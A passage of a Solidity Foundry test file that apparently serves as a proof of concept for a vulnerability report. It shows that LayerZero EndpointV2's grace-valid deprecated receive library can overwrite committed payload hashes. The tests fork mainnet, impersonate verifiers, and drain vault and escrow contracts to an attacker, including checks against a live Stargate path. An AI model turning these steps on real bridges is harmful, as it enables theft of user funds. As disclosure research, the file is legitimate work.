        console2.log("attacker after             :", token.balanceOf(attacker));
        console2.log("==== REVOCATION ENFORCEMENT BROKEN (PASS) ====");
    }

    function test_FORK_ActualConfigs_NoCrossArrayOverlapOnRealPoCPaths() public {
        vm.roll(upgradeBlock + 1);
        vm.warp(upgradeTs + 1);
        assertTrue(block.number > upgradeBlock, "strictly post-upgrade");

        // TokenEscrowAdapter and OFTAdapterCanonical do not set per-receiver ULN overrides in this PoC.
        // Their actual path config is therefore the same default config returned for any fresh receiver address.
        address tokenEscrowAdapterPath = address(0x3000000000000000000000000000000000000003);
        address oftAdapterPath = address(0x4000000000000000000000000000000000000004);

        UlnConfig memory vaultOldCfg = libOld.getUlnConfig(address(vault), SRC_EID);
        UlnConfig memory escrowOldCfg = libOld.getUlnConfig(tokenEscrowAdapterPath, SRC_EID);
        UlnConfig memory oftOldCfg = libOld.getUlnConfig(oftAdapterPath, SRC_EID);

        UlnConfig memory vaultNewCfg = libNew.getUlnConfig(address(vault), SRC_EID);
        UlnConfig memory escrowNewCfg = libNew.getUlnConfig(tokenEscrowAdapterPath, SRC_EID);
        UlnConfig memory oftNewCfg = libNew.getUlnConfig(oftAdapterPath, SRC_EID);

        console2.log("==== REAL CONFIG OVERLAP INSPECTION ====");
        _assertConfigsEquivalent("libOld default", vaultOldCfg, escrowOldCfg);
        _assertConfigsEquivalent("libOld default", vaultOldCfg, oftOldCfg);
        _assertConfigsEquivalent("libNew default", vaultNewCfg, escrowNewCfg);
        _assertConfigsEquivalent("libNew default", vaultNewCfg, oftNewCfg);

        _inspectAndAssertNoOverlap("VaultOApp/libOld", vaultOldCfg);
        _inspectAndAssertNoOverlap("TokenEscrowAdapter/libOld", escrowOldCfg);
        _inspectAndAssertNoOverlap("OFTAdapterCanonical/libOld", oftOldCfg);

        _inspectAndAssertNoOverlap("VaultOApp/libNew", vaultNewCfg);
        _inspectAndAssertNoOverlap("TokenEscrowAdapter/libNew", escrowNewCfg);
        _inspectAndAssertNoOverlap("OFTAdapterCanonical/libNew", oftNewCfg);
        console2.log("==== NO OVERLAP ON REAL PoC PATHS (PASS) ====");
    }

    // ================== SCENARIO 1: CROSS-LIBRARY QUORUM MIXING ==================
    // Tests that verification evidence CANNOT be mixed across library instances.
    // If dvnA verifies on libNew and dvnB verifies on libOld, NEITHER library
    // should be able to commitVerification, because each maintains independent
    // hashLookup state. Both commits MUST revert.
    function test_FORK_CrossLibraryQuorumMixing_shouldRevert() public {
        // Strictly post-upgrade
        vm.roll(upgradeBlock + 1);
        vm.warp(upgradeTs + 1);
        assertTrue(block.number > upgradeBlock, "strictly post-upgrade");

        // Read REAL libOld config
        UlnConfig memory oldCfg = libOld.getUlnConfig(address(vault), SRC_EID);
        require(oldCfg.requiredDVNs.length >= oldCfg.requiredDVNCount, "libOld: requiredDVNs length < count");
        uint256 n = uint256(oldCfg.requiredDVNCount);
        uint64 confs = oldCfg.confirmations;

        console2.log("==== CROSS-LIBRARY QUORUM MIXING TEST ====");
        console2.log("libOld requiredDVNCount:", n);
        console2.log("libOld confirmations   :", uint256(confs));

        // This test requires at least 2 required DVNs to split across libs
        require(n >= 2, "SKIP: libOld requires < 2 DVNs, cannot test mixing");

        address dvnA = oldCfg.requiredDVNs[0];
        address dvnB = oldCfg.requiredDVNs[1];
        console2.log("dvnA (will verify on libNew):", dvnA);
        console2.log("dvnB (will verify on libOld):", dvnB);
        console2.log("dvnNew (libNew config)      :", dvnNew);

        // Fresh nonce for this test (use nonce after the main test's nonce range)
        uint64 nonce = endpoint.lazyInboundNonce(address(vault), SRC_EID, REMOTE_VAULT) + 1;
        bytes memory header = _buildPacketHeader(nonce);

        // Payload hash for this test
        bytes memory mixMsg = abi.encode(alice, uint256(1e18));
        bytes32 mixGuid = keccak256("mix-test-guid");
        bytes32 mixHash = keccak256(abi.encodePacked(mixGuid, mixMsg));

        console2.log("nonce          :", nonce);
        console2.log("mixHash        :"); console2.logBytes32(mixHash);

        // Confirm slot is empty
        assertEq(
            endpoint.inboundPayloadHash(address(vault), SRC_EID, REMOTE_VAULT, nonce),
            bytes32(0),
            "slot must be empty"
        );

        // ---- SPLIT VERIFICATION ACROSS LIBRARIES ----

        // dvnA verifies on libNew (libNew does NOT require dvnA; it requires dvnNew)
        // This stores evidence in libNew.hashLookup but dvnA is not in libNew's config
        vm.prank(dvnA);
        libNew.verify(header, mixHash, 1);
        console2.log("dvnA verified on libNew (cross-lib evidence)");

        // dvnB verifies on libOld (libOld requires BOTH dvnA and dvnB)
        // This stores evidence in libOld.hashLookup but only for dvnB, not dvnA
        vm.prank(dvnB);
        libOld.verify(header, mixHash, confs);
        console2.log("dvnB verified on libOld (partial quorum)");

        // ---- ATTEMPT COMMITS: BOTH MUST REVERT ----

        // Commit A: libNew should revert because:
        //   - libNew requires dvnNew (not dvnA)
        //   - dvnNew has NOT verified on libNew
        //   - dvnA's evidence is irrelevant to libNew's required config
        console2.log("Attempting libNew.commitVerification (expect revert)...");
        vm.expectRevert(ReceiveUlnBase.LZ_ULN_Verifying.selector);
        libNew.commitVerification(header, mixHash);
        console2.log("libNew commit reverted as expected (no quorum)");

        // Commit B: libOld should revert because:
        //   - libOld requires BOTH dvnA AND dvnB
        //   - Only dvnB verified on libOld's hashLookup
        //   - dvnA verified on libNew (different contract), NOT on libOld
        //   - So libOld sees only 1 of 2 required DVNs => quorum not met
        console2.log("Attempting libOld.commitVerification (expect revert)...");
        vm.expectRevert(ReceiveUlnBase.LZ_ULN_Verifying.selector);
        libOld.commitVerification(header, mixHash);
        console2.log("libOld commit reverted as expected (no quorum)");

        // Confirm no hash was written to endpoint
        bytes32 storedAfterMix = endpoint.inboundPayloadHash(address(vault), SRC_EID, REMOTE_VAULT, nonce);
        assertEq(storedAfterMix, bytes32(0), "slot must remain empty after failed mixing");

        console2.log("==== MIXING TEST: PASS (both commits reverted) ====");
        console2.log("Each library maintains independent hashLookup.");
        console2.log("Cross-library quorum mixing is NOT possible.");
        console2.log("=================================================");
    }

    // ================== SUPPORTING / DESIGN-LEVEL: SECURITY DOWNGRADE ==================
    // Demonstrates a generic protocol property: during grace, a hash committed under a
    // STRONGER libNew quorum (3 required DVNs, higher confirmations) can be overwritten
    // via the grace-valid libOld which enforces a WEAKER quorum.
    // NOTE: libNew DVN addresses below are identity placeholders for quorum simulation.
    //       libOld config and quorum are REAL from mainnet fork (unmodified).
    //       This is SUPPORTING evidence for the "downgrade-of-security" argument,
    //       NOT the primary production reproduction (see test_FORK_RevocationEnforcementBroken_And_Drain).
    function test_FORK_SecurityDowngrade_StrongerLibNew_OverwrittenByGraceLibOld() public {
        console2.log("========================================================");
        console2.log("SUPPORTING TEST: demonstrates downgrade property;");
        console2.log("libNew DVN addresses are placeholders for quorum simulation.");
        console2.log("========================================================");

        // Strictly post-upgrade
        vm.roll(upgradeBlock + 1);
        vm.warp(upgradeTs + 1);
        assertTrue(block.number > upgradeBlock, "strictly post-upgrade");
        assertEq(endpoint.defaultReceiveLibrary(SRC_EID), address(libNew), "default must be libNew");

        // --- Configure libNew with STRONGER quorum for SRC_EID ---
        // Deterministic placeholder DVN identities (sorted ascending for UlnBase)
        address dvnX = address(0xAA00000000000000000000000000000000000001);
        address dvnY = address(0xBb00000000000000000000000000000000000002);
        address dvnZ = address(0xcC00000000000000000000000000000000000003);

        uint64 newConfirmations = uint64(oldConfirmations) + 44;
        uint8  newRequiredDVNCount = 3;

        {
            address[] memory strongDvns = new address[](3);
            strongDvns[0] = dvnX;
            strongDvns[1] = dvnY;
            strongDvns[2] = dvnZ;

            UlnConfig memory strongCfg = UlnConfig({
                confirmations: newConfirmations,
                requiredDVNCount: newRequiredDVNCount,
                optionalDVNCount: 0,
                optionalDVNThreshold: 0,
                requiredDVNs: strongDvns,
                optionalDVNs: new address[](0)
            });

            SetDefaultUlnConfigParam[] memory p = new SetDefaultUlnConfigParam[](1);
            p[0] = SetDefaultUlnConfigParam(SRC_EID, strongCfg);
            vm.prank(endpointOwner);
            libNew.setDefaultUlnConfigs(p);
        }

        console2.log("oldConfirmations (REAL)     :", uint256(oldConfirmations));
        console2.log("oldRequiredDVNCount (REAL)  :", uint256(oldRequiredDVNCount));
        console2.log("newConfirmations (STRONG)   :", uint256(newConfirmations));
        console2.log("newRequiredDVNCount (STRONG):", uint256(newRequiredDVNCount));
        console2.log("dvnX:", dvnX);
        console2.log("dvnY:", dvnY);
        console2.log("dvnZ:", dvnZ);

        // Fresh nonce
        uint64 nonce = endpoint.lazyInboundNonce(address(vault), SRC_EID, REMOTE_VAULT) + 1;
        bytes memory header = _buildPacketHeader(nonce);

        assertEq(
            endpoint.inboundPayloadHash(address(vault), SRC_EID, REMOTE_VAULT, nonce),
            bytes32(0),
            "slot must be empty"
        );

        // 1) Commit legitHash via libNew meeting STRONG quorum (3 DVNs, high confirmations)
        bytes memory legitMsg = abi.encode(alice, uint256(50e18));
        bytes32 legitGuid = keccak256("downgrade-legit-guid");
        bytes32 legitHash = keccak256(abi.encodePacked(legitGuid, legitMsg));

        vm.prank(dvnX);
        libNew.verify(header, legitHash, newConfirmations);
        vm.prank(dvnY);
        libNew.verify(header, legitHash, newConfirmations);
        vm.prank(dvnZ);
        libNew.verify(header, legitHash, newConfirmations);
        libNew.commitVerification(header, legitHash);

        bytes32 storedLegit = endpoint.inboundPayloadHash(address(vault), SRC_EID, REMOTE_VAULT, nonce);
        assertEq(storedLegit, legitHash, "strong-quorum legit hash stored");
        console2.log("legitHash committed via STRONG libNew (3 DVNs)");

        // 2) Overwrite via grace-valid libOld using REAL (weaker) quorum
        bytes memory forgedMsg = abi.encode(attacker, uint256(999e18));
        bytes32 forgedGuid = keccak256("downgrade-forged-guid");
        bytes32 forgedHash = keccak256(abi.encodePacked(forgedGuid, forgedMsg));

        UlnConfig memory oldCfg = libOld.getUlnConfig(address(vault), SRC_EID);
        require(oldCfg.requiredDVNs.length >= oldCfg.requiredDVNCount, "libOld: requiredDVNs length < count");
        address dvnOldFirst = oldCfg.requiredDVNs[0];

        _verifyWithRealLibOldQuorum(header, forgedHash, oldCfg);
        vm.prank(dvnOldFirst);
        libOld.commitVerification(header, forgedHash);

        bytes32 storedAfter = endpoint.inboundPayloadHash(address(vault), SRC_EID, REMOTE_VAULT, nonce);
        assertEq(storedAfter, forgedHash, "DOWNGRADE OVERWRITE succeeded");
        assertTrue(storedAfter != legitHash, "strong-quorum legit hash erased by weaker quorum");
        console2.log("forgedHash overwrote via WEAK libOld (real quorum)");

        // Triage logs
        console2.log("==== SUPPORTING: SECURITY DOWNGRADE PROOF ====");
        console2.log("libNew required 3 DVNs + confs:", uint256(newConfirmations));
        console2.log("libOld required", uint256(oldRequiredDVNCount), "DVNs + confs:", uint256(oldConfirmations));
        console2.log("Hash committed under STRONG quorum was overwritten");
        console2.log("by grace-valid libOld under WEAKER quorum.");
        console2.log("legitHash :"); console2.logBytes32(legitHash);
        console2.log("forgedHash:"); console2.logBytes32(forgedHash);
        console2.log("stored    :"); console2.logBytes32(storedAfter);
        console2.log("==============================================");
    }

    // ================== VERIFICATION-EXECUTION BINDING BREAK ==================
    function test_FORK_VerificationExecutionBindingBroken() public {
        vm.roll(upgradeBlock + 1);
        vm.warp(upgradeTs + 1);
        assertTrue(block.number > upgradeBlock, "strictly post-upgrade");
        assertEq(endpoint.defaultReceiveLibrary(SRC_EID), address(libNew));

        uint64 nonce = endpoint.lazyInboundNonce(address(vault), SRC_EID, REMOTE_VAULT) + 1;
        bytes memory header = _buildPacketHeader(nonce);

        assertEq(
            endpoint.inboundPayloadHash(address(vault), SRC_EID, REMOTE_VAULT, nonce),
            bytes32(0),
            "slot must be empty"
        );

        bytes memory legitMsg = abi.encode(alice, uint256(123e18));
        bytes32 legitGuid = keccak256("binding-legit-guid");
        bytes32 legitHash = keccak256(abi.encodePacked(legitGuid, legitMsg));

        vm.prank(dvnNew);
        libNew.verify(header, legitHash, 1);
        libNew.commitVerification(header, legitHash);

        bytes32 storedAfterLegit =
            endpoint.inboundPayloadHash(address(vault), SRC_EID, REMOTE_VAULT, nonce);
        require(storedAfterLegit == legitHash, "legit hash must be stored first");

        UlnConfig memory oldCfg = libOld.getUlnConfig(address(vault), SRC_EID);

        bytes memory forgedMsg =
            abi.encode(attacker, token.balanceOf(address(vault)));
        bytes32 forgedGuid = keccak256("binding-forged-guid");
        bytes32 forgedHash = keccak256(abi.encodePacked(forgedGuid, forgedMsg));

        _verifyWithRealLibOldQuorum(header, forgedHash, oldCfg);
        address dvnOldFirst = oldCfg.requiredDVNs[0];
        vm.prank(dvnOldFirst);
        libOld.commitVerification(header, forgedHash);

        bytes32 storedAfterOverwrite =
            endpoint.inboundPayloadHash(address(vault), SRC_EID, REMOTE_VAULT, nonce);
        require(storedAfterOverwrite == forgedHash, "overwrite must occur");

        uint256 attackerBefore = token.balanceOf(attacker);
        uint256 aliceBefore = token.balanceOf(alice);

        Origin memory origin = Origin({
            srcEid: SRC_EID,
            sender: REMOTE_VAULT,
            nonce: nonce
        });
        endpoint.lzReceive(origin, address(vault), forgedGuid, forgedMsg, "");

        require(token.balanceOf(alice) == aliceBefore, "legit payload never executed");
        require(token.balanceOf(address(vault)) == 0, "vault drained");
        require(
            token.balanceOf(attacker) == attackerBefore + VAULT_BALANCE,
            "forged payload executed"
        );
    }

    // ================== REALISTIC ADAPTER IMPACT: ESCROW RELEASE DRAIN ==================
    // Demonstrates the grace-period overwrite against a production-like OFT adapter /
    // token escrow receiver pattern. The adapter holds pre-funded ERC20 escrow and releases
    // to recipients based on verified cross-chain lzReceive payloads.
    // The bug is entirely in EndpointV2 grace semantics, NOT in the adapter.
    function test_FORK_RealisticAdapterRelease_Overwrite_And_Drain() public {
        console2.log("==== REALISTIC ADAPTER ESCROW RELEASE TEST ====");

        vm.roll(upgradeBlock + 1);
        vm.warp(upgradeTs + 1);
        assertTrue(block.number > upgradeBlock, "strictly post-upgrade");
        assertEq(endpoint.defaultReceiveLibrary(SRC_EID), address(libNew), "default must be libNew");

        // --- Deploy realistic adapter + separate escrow token ---
        MockToken escrowToken = new MockToken();
        TokenEscrowAdapter adapter = new TokenEscrowAdapter(address(endpoint), address(escrowToken));

        uint256 escrowBalance = 5_000_000e18;
        escrowToken.mint(address(adapter), escrowBalance);

        // Configure trusted remote peer (realistic: only owner can set)
        adapter.setTrustedRemote(SRC_EID, REMOTE_VAULT);

        console2.log("adapter        :", address(adapter));
        console2.log("escrowToken    :", address(escrowToken));
        console2.log("escrow balance :", escrowBalance);

        // Nonce for the adapter path (adapter is a fresh receiver, nonce starts at 0+1=1)
        uint64 nonce = endpoint.lazyInboundNonce(address(adapter), SRC_EID, REMOTE_VAULT) + 1;
        bytes memory header = _buildPacketHeaderFor(nonce, address(adapter));

        assertEq(
            endpoint.inboundPayloadHash(address(adapter), SRC_EID, REMOTE_VAULT, nonce),
            bytes32(0),
            "adapter slot must be empty"
        );

        // --- Step 1: libNew commits legitimate release (alice gets 100 tokens) ---
        bytes memory legitMsg = abi.encode(alice, uint256(100e18));
        bytes32 legitGuid = keccak256("adapter-legit-guid");
        bytes32 legitHash = keccak256(abi.encodePacked(legitGuid, legitMsg));

        vm.prank(dvnNew);
        libNew.verify(header, legitHash, 1);
        libNew.commitVerification(header, legitHash);

        bytes32 storedLegit = endpoint.inboundPayloadHash(address(adapter), SRC_EID, REMOTE_VAULT, nonce);
        assertEq(storedLegit, legitHash, "legit release hash stored by libNew");
        console2.log("legitHash committed (alice gets 100 tokens)");

        // --- Step 2: libOld overwrites with forged full-drain release to attacker ---
        bytes memory forgedMsg = abi.encode(attacker, escrowBalance);
        bytes32 forgedGuid = keccak256("adapter-forged-guid");
        bytes32 forgedHash = keccak256(abi.encodePacked(forgedGuid, forgedMsg));

        // Read REAL libOld config for the adapter (same default config applies)
        UlnConfig memory oldCfg = libOld.getUlnConfig(address(adapter), SRC_EID);
        require(oldCfg.requiredDVNCount > 0, "libOld: no requiredDVNs for adapter");
        address dvnOldFirst = oldCfg.requiredDVNs[0];

        console2.log("libOld requiredDVNCount for adapter:", uint256(oldCfg.requiredDVNCount));
        console2.log("libOld confirmations for adapter   :", uint256(oldCfg.confirmations));

        // Satisfy REAL libOld quorum (all required DVNs verify on libOld)
        _verifyWithRealLibOldQuorum(header, forgedHash, oldCfg);
        vm.prank(dvnOldFirst);
        libOld.commitVerification(header, forgedHash);

        bytes32 storedAfter = endpoint.inboundPayloadHash(address(adapter), SRC_EID, REMOTE_VAULT, nonce);
        assertEq(storedAfter, forgedHash, "OVERWRITE: forged drain hash replaced legit release");
        assertTrue(storedAfter != legitHash, "legit release hash erased");
        console2.log("forgedHash overwrote (attacker drains full escrow)");

        // --- Step 3: Execute via EndpointV2.lzReceive ---
        uint256 aliceBefore = escrowToken.balanceOf(alice);
        uint256 attackerBefore = escrowToken.balanceOf(attacker);
        uint256 adapterBefore = escrowToken.balanceOf(address(adapter));

        Origin memory origin = Origin({srcEid: SRC_EID, sender: REMOTE_VAULT, nonce: nonce});
        endpoint.lzReceive(origin, address(adapter), forgedGuid, forgedMsg, "");

        // --- Step 4: Verify impact ---
        uint256 aliceAfter = escrowToken.balanceOf(alice);
        uint256 attackerAfter = escrowToken.balanceOf(attacker);
        uint256 adapterAfter = escrowToken.balanceOf(address(adapter));

        // Alice never received the legitimate 100-token release
        assertEq(aliceAfter, aliceBefore, "alice must NOT receive legit payout");

        // Attacker received the full escrow balance
        assertEq(attackerAfter, attackerBefore + escrowBalance, "attacker received full escrow");

        // Adapter is drained
        assertEq(adapterAfter, 0, "adapter escrow fully drained");

        // Triage-friendly logs
        console2.log("==== REALISTIC ADAPTER: ESCROW DRAIN PROOF ====");
        console2.log("adapter escrow before:", adapterBefore);
        console2.log("adapter escrow after :", adapterAfter);
        console2.log("alice balance before :", aliceBefore);
        console2.log("alice balance after  :", aliceAfter);
        console2.log("attacker before      :", attackerBefore);
        console2.log("attacker after       :", attackerAfter);
        console2.log("libOld quorum (REAL) :", uint256(oldCfg.requiredDVNCount));
        console2.log("libOld confs  (REAL) :", uint256(oldCfg.confirmations));
        console2.log("legitHash (100 to alice):"); console2.logBytes32(legitHash);
        console2.log("forgedHash (drain)     :"); console2.logBytes32(forgedHash);
        console2.log("Executed payload = forged (drain). Legit never ran.");
        console2.log("Bug is in EndpointV2 grace overwrite, not adapter.");
        console2.log("================================================");
    }

    // ================== OFFICIAL OFTAdapter CANONICAL FLOW TESTS ==================
    // These tests demonstrate the EndpointV2 grace overwrite vulnerability against
    // LayerZero's OFFICIAL OFTAdapter receive/credit flow (faithful reproduction).
    //
    // The receiver is OFTAdapterCanonical, which mirrors the exact code from:
    //   packages/layerzero-v2/evm/oapp/contracts/oft/OFTAdapter.sol
    //   packages/layerzero-v2/evm/oapp/contracts/oft/OFTCore.sol
    //   packages/layerzero-v2/evm/oapp/contracts/oft/libs/OFTMsgCodec.sol
    //
    // The _credit() function is: innerToken.safeTransfer(_to, _amountLD)
    // The payload encoding follows OFTMsgCodec: abi.encodePacked(bytes32 sendTo, uint64 amountSD)
    //
    // This is NOT a custom demo receiver. It is the canonical escrow-release pattern
    // used by production OFTAdapter deployments.
    // This test proves that the protocol does not treat first committed verification state as canonical.
    // A conflicting later verification can replace it before execution.
    function test_FORK_CanonicalVerificationState_IsReplaceable_BeforeExecution() public {
        // ---------------------------------------------------------------------
        // Phase 0: strictly post-upgrade
        // ---------------------------------------------------------------------
        vm.roll(upgradeBlock + 1);
        vm.warp(upgradeTs + 1);
        assertTrue(block.number > upgradeBlock, "strictly post-upgrade");
        assertEq(
            endpoint.defaultReceiveLibrary(SRC_EID),
            address(libNew),
            "current default receive library must be libNew"
        );

        // ---------------------------------------------------------------------
        // Phase 1: prepare fresh receiver state
        // ---------------------------------------------------------------------
        MockToken innerToken = new MockToken();
        OFTAdapterCanonical adapter = new OFTAdapterCanonical(
            address(innerToken),
            address(endpoint),
            18,
            6
        );

        uint256 escrowBalance = 2_000_000e18;
        innerToken.mint(address(adapter), escrowBalance);
        adapter.setPeer(SRC_EID, REMOTE_VAULT);

        uint64 nonce = endpoint.lazyInboundNonce(address(adapter), SRC_EID, REMOTE_VAULT) + 1;
        bytes memory header = _buildPacketHeaderFor(nonce, address(adapter));

        assertEq(
            endpoint.inboundPayloadHash(address(adapter), SRC_EID, REMOTE_VAULT, nonce),
            bytes32(0),
            "fresh adapter nonce slot must be empty"
        );

        console2.log("==== CANONICAL VERIFICATION STATE TEST ====");
        console2.log("adapter                    :", address(adapter));
        console2.log("nonce                      :", nonce);
        console2.log("current receive lib        :", address(libNew));
        console2.log("deprecated grace-valid lib :", address(libOld));

        // ---------------------------------------------------------------------
        // Phase 2: current path commits first payload
        // ---------------------------------------------------------------------
        uint64 legitAmountSD = 500e6;
        bytes memory legitMsg = OFTMsgCodecFaithful.encode(
            bytes32(uint256(uint160(alice))),
            legitAmountSD,
            ""
        );
        bytes32 legitGuid = keccak256("canonicality-legit-guid");
        bytes32 legitHash = keccak256(abi.encodePacked(legitGuid, legitMsg));

        vm.prank(dvnNew);
        libNew.verify(header, legitHash, 1);
        libNew.commitVerification(header, legitHash);

        bytes32 storedAfterCurrentCommit =
            endpoint.inboundPayloadHash(address(adapter), SRC_EID, REMOTE_VAULT, nonce);
        assertEq(storedAfterCurrentCommit, legitHash, "first committed payload must be stored initially");

        console2.log("first payload committed first:");
        console2.logBytes32(legitHash);

        // ---------------------------------------------------------------------
        // Phase 3: later conflicting payload is committed through deprecated path
        // ---------------------------------------------------------------------
        uint64 forgedAmountSD = uint64(escrowBalance / adapter.decimalConversionRate());
        bytes memory forgedMsg = OFTMsgCodecFaithful.encode(
            bytes32(uint256(uint160(attacker))),
            forgedAmountSD,
            ""
        );
        bytes32 forgedGuid = keccak256("canonicality-forged-guid");
        bytes32 forgedHash = keccak256(abi.encodePacked(forgedGuid, forgedMsg));

        UlnConfig memory oldCfg = libOld.getUlnConfig(address(adapter), SRC_EID);
        require(oldCfg.requiredDVNCount > 0, "libOld: no requiredDVNs for adapter");
        address firstDeprecatedSigner = oldCfg.requiredDVNs[0];

        _verifyWithRealLibOldQuorum(header, forgedHash, oldCfg);
        vm.prank(firstDeprecatedSigner);
        libOld.commitVerification(header, forgedHash);

        bytes32 storedAfterDeprecatedOverwrite =
            endpoint.inboundPayloadHash(address(adapter), SRC_EID, REMOTE_VAULT, nonce);
        assertEq(
            storedAfterDeprecatedOverwrite,
            forgedHash,
            "conflicting later verification must replace stored state"
        );
        assertTrue(
            storedAfterDeprecatedOverwrite != legitHash,
            "first committed payload must not remain canonical"
        );

        console2.log("first committed payload did not become canonical");
        console2.log("conflicting later verification replaced canonical state before execution");
        console2.log("replaced payload:");
        console2.logBytes32(forgedHash);

        // ---------------------------------------------------------------------
        // Phase 4: execution follows replaced state
        // ---------------------------------------------------------------------
        uint256 aliceBefore = innerToken.balanceOf(alice);
        uint256 attackerBefore = innerToken.balanceOf(attacker);
        uint256 adapterBefore = innerToken.balanceOf(address(adapter));

        Origin memory origin = Origin({
            srcEid: SRC_EID,
            sender: REMOTE_VAULT,
            nonce: nonce
        });
        endpoint.lzReceive(origin, address(adapter), forgedGuid, forgedMsg, "");

        uint256 aliceAfter = innerToken.balanceOf(alice);
        uint256 attackerAfter = innerToken.balanceOf(attacker);
        uint256 adapterAfter = innerToken.balanceOf(address(adapter));

        assertEq(aliceAfter, aliceBefore, "first committed OFT payload never executed");
        assertEq(attackerAfter, attackerBefore + escrowBalance, "replaced OFT payload determined execution outcome");
        assertEq(adapterAfter, 0, "adapter escrow must be drained by replaced payload");

        console2.log("execution followed replaced state, not first committed state");
        console2.log("adapter escrow before      :", adapterBefore);
        console2.log("adapter escrow after       :", adapterAfter);
        console2.log("alice balance after        :", aliceAfter);
        console2.log("attacker balance after     :", attackerAfter);
        console2.log("==== CANONICAL STATE REPLACEMENT (PASS) ====");
    }

    function test_FORK_StargateTokenMessaging_DefaultPath_PublicSourcePeer_IsLive() public {
        vm.roll(upgradeBlock + 1);
        vm.warp(upgradeTs + 1);
        assertTrue(block.number > upgradeBlock, "strictly post-upgrade");
        assertEq(endpoint.defaultReceiveLibrary(SRC_EID), address(libNew), "default receive lib must be libNew");

        address receiver = STARGATE_TOKEN_MESSAGING_ETH;
        bytes32 peer = STARGATE_TOKEN_MESSAGING_ARB;

        (address activeReceiveLib, bool isDefault) = endpoint.getReceiveLibrary(receiver, SRC_EID);
        assertEq(activeReceiveLib, address(libNew), "Stargate receiver must inherit current default receive lib");
        assertTrue(isDefault, "Stargate receiver must be on default receive-lib path");

        assertTrue(
            endpoint.isValidReceiveLibrary(receiver, SRC_EID, address(libOld)),
            "deprecated libOld must remain grace-valid for live Stargate path"
        );

        bytes32 configuredPeer = IOAppPeerLike(receiver).peers(SRC_EID);
        assertEq(configuredPeer, peer, "receiver peer mapping must match live Arbitrum source peer");

        uint64 liveInboundNonce = endpoint.inboundNonce(receiver, SRC_EID, peer);
        uint64 liveLazyInboundNonce = endpoint.lazyInboundNonce(receiver, SRC_EID, peer);
        assertTrue(liveInboundNonce > 0, "live Stargate path must already have verified traffic");
        assertTrue(liveLazyInboundNonce > 0, "live Stargate path must already have delivered traffic");

        uint64 nextNonce = liveLazyInboundNonce + 1;
        assertEq(
            endpoint.inboundPayloadHash(receiver, SRC_EID, peer, nextNonce),
            bytes32(0),
            "next Stargate nonce slot must be empty before verification"
        );

        console2.log("==== LIVE STARGATE DEFAULT-PATH CHECK ====");
        console2.log("receiver                    :", receiver);
        console2.logBytes32(peer);
        console2.log("current receive lib         :", activeReceiveLib);
        console2.log("deprecated grace-valid lib  :", address(libOld));
        console2.log("live inbound nonce          :", liveInboundNonce);
        console2.log("live lazy inbound nonce     :", liveLazyInboundNonce);
        console2.log("next nonce slot is empty on a real production path");
        console2.log("public source peer is already active on the same srcEid");
        console2.log("==========================================");
    }

    function test_FORK_ProductionDefaultPath_RevocationBreaksCanonicalVerificationState() public {
        vm.roll(upgradeBlock + 1);
        vm.warp(upgradeTs + 1);
        assertTrue(block.number > upgradeBlock, "strictly post-upgrade");
        assertEq(endpoint.defaultReceiveLibrary(SRC_EID), address(libNew), "default receive lib must be libNew");

        address receiver = STARGATE_TOKEN_MESSAGING_ETH;
        bytes32 peer = STARGATE_TOKEN_MESSAGING_ARB;

        (address activeReceiveLib, bool isDefault) = endpoint.getReceiveLibrary(receiver, SRC_EID);
        assertEq(activeReceiveLib, address(libNew), "live production receiver must inherit current default receive lib");
        assertTrue(isDefault, "live production receiver must be on default receive-lib path");

        (address appTimeoutLib, uint256 appTimeoutExpiry) = endpoint.receiveLibraryTimeout(receiver, SRC_EID);
        assertEq(appTimeoutLib, address(0), "receiver must not depend on app-specific receive-lib timeout");
        assertEq(appTimeoutExpiry, 0, "receiver must not depend on app-specific receive-lib timeout");

        (address defaultTimeoutLib, uint256 defaultTimeoutExpiry) = endpoint.defaultReceiveLibraryTimeout(SRC_EID);
        assertEq(defaultTimeoutLib, address(libOld), "default timeout must point to deprecated libOld");
        assertTrue(defaultTimeoutExpiry > block.number, "default timeout must still be live");
        assertTrue(
            endpoint.isValidReceiveLibrary(receiver, SRC_EID, address(libOld)),
            "deprecated libOld must remain grace-valid on live default path"
        );

        bytes32 configuredPeer = IOAppPeerLike(receiver).peers(SRC_EID);
        assertEq(configuredPeer, peer, "live receiver peer mapping must match public source peer");

        uint64 liveInboundNonce = endpoint.inboundNonce(receiver, SRC_EID, peer);
        uint64 liveLazyInboundNonce = endpoint.lazyInboundNonce(receiver, SRC_EID, peer);
        assertTrue(liveInboundNonce > 0, "production path must already have live verified traffic");
        assertTrue(liveLazyInboundNonce > 0, "production path must already have live delivered traffic");

        uint64 nonce = liveInboundNonce + 1;
        bytes memory header = _buildPacketHeaderForPath(nonce, receiver, peer);

        assertEq(
            endpoint.inboundPayloadHash(receiver, SRC_EID, peer, nonce),
            bytes32(0),
            "fresh production-path nonce slot must be empty"
        );

        UlnConfig memory curCfg = libNew.getUlnConfig(receiver, SRC_EID);
        UlnConfig memory oldCfg = libOld.getUlnConfig(receiver, SRC_EID);
        address revokedFromCurrentDVN = oldCfg.requiredDVNs[0];

        assertEq(curCfg.requiredDVNCount, 1, "libNew default path must require one DVN");
        assertEq(curCfg.requiredDVNs[0], dvnNew, "libNew default path must require dvnNew");
        assertTrue(
            revokedFromCurrentDVN != dvnNew,
            "revoked-from-current DVN must be excluded from current default path"
        );

        bytes32 legitHash = keccak256("stargate-live-default-path-legit");
        bytes32 forgedHash = keccak256("stargate-live-default-path-forged");

        vm.prank(dvnNew);
        libNew.verify(header, legitHash, 1);
        libNew.commitVerification(header, legitHash);

        bytes32 storedAfterCurrentCommit = endpoint.inboundPayloadHash(receiver, SRC_EID, peer, nonce);
        assertEq(storedAfterCurrentCommit, legitHash, "current default path must commit first payload");

        vm.prank(revokedFromCurrentDVN);
        libNew.verify(header, forgedHash, 1);

        vm.prank(revokedFromCurrentDVN);
        vm.expectRevert(ReceiveUlnBase.LZ_ULN_Verifying.selector);
        libNew.commitVerification(header, forgedHash);

        _verifyWithRealLibOldQuorum(header, forgedHash, oldCfg);
        vm.prank(revokedFromCurrentDVN);
        libOld.commitVerification(header, forgedHash);

        bytes32 storedAfterDeprecatedOverwrite = endpoint.inboundPayloadHash(receiver, SRC_EID, peer, nonce);
        assertEq(
            storedAfterDeprecatedOverwrite,
            forgedHash,
            "deprecated grace-valid path must replace canonical verification state"
        );
        assertTrue(
            storedAfterDeprecatedOverwrite != legitHash,
            "first committed verification state must not remain canonical"
        );

        console2.log("==== LIVE DEFAULT-PATH CANONICALITY TEST ====");
        console2.log("receiver                           :", receiver);
        console2.log("current receive lib                :", activeReceiveLib);
        console2.log("deprecated grace-valid lib         :", address(libOld));
